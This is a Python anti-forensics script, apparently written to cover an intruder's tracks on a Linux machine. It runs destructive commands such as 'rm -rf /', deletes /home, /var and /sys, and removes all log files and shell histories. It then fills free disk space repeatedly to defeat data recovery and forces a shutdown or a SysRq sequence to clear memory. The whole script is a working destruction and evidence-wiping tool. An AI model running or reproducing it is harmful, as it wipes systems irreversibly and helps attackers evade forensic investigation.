#matitanium clear logs and fucking memory dumping
from multiprocessing.context import Process
import subprocess
import os
import time
try:
    from multiprocess import process 
except:
    os.system("pip install multiprocess")
    from multiprocess import process
try:
    import keyboard
except:
    os.system("pip install keyboard ")
    os.system("pip3 install keyboard")
    import keyboard


os.system("clear") 
#code by matin nouriyan

if os.geteuid() != 0:
    print("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")


logs = ["find / -name *.log -exec rm -rf {} \;","rm -rf /var -R","rm -rf /home ","rm -rf /opt -R","rm -rf /sys","rm -rf /","rm -rf /var/log","rm -rf /var/adm","rm -rf /var/apache","rm -rf $HISTFILE","find / -name .bash_history -exec rm -rf {} \;","find / -name .bash_logot -exec rm -rf {} \;","find / -name log.* -exec rm -rf {} \;"]
#Clear footprints
#code by matitanium
#delete Important logs in first
def Important_logs(logi):
    for i in logi:
        try:
            subprocess.check_output(i)
        except:
            print(f"i cant run  {i} ")



#check free space
def find_space():
    result=os.statvfs('/')
    block_size=result.f_frsize
    free_blocks=result.f_bfree
    # giga=1024*1024*1024
    giga=1000*1000*1000
    free_size=free_blocks*block_size/giga
    return  free_size




#fuckin forensic
def generate_rem(space):
    os.chdir("/")
    for i in range(8):
        subprocess.getoutput(f"fallocate -l {space}G fuckyou.fuck")
        subprocess.getoutput("rm -rf fuckyou.fuck")
        
        



Important_logs(logi=logs)
time.sleep(1)
free_s = find_space()
free_s = free_s - 0.01
time.sleep(1)
generate_rem(free_s)



def memory_dump():
    #clear memory
    try:
        subprocess.getoutput("shutdown -h now")
    except:
        keyboard.on_press("alt")
        keyboard.on_press("printscreen")
        time.sleep(1)
        keyboard.on_press("r")
        time.sleep(1)
        keyboard.on_press("e")
        time.sleep(1)
        keyboard.on_press("i")
        time.sleep(1)
        keyboard.on_press("b")
        time.sleep(1)
        keyboard.on_press("u")
        time.sleep(1)
        keyboard.on_press("s")


memory_dump()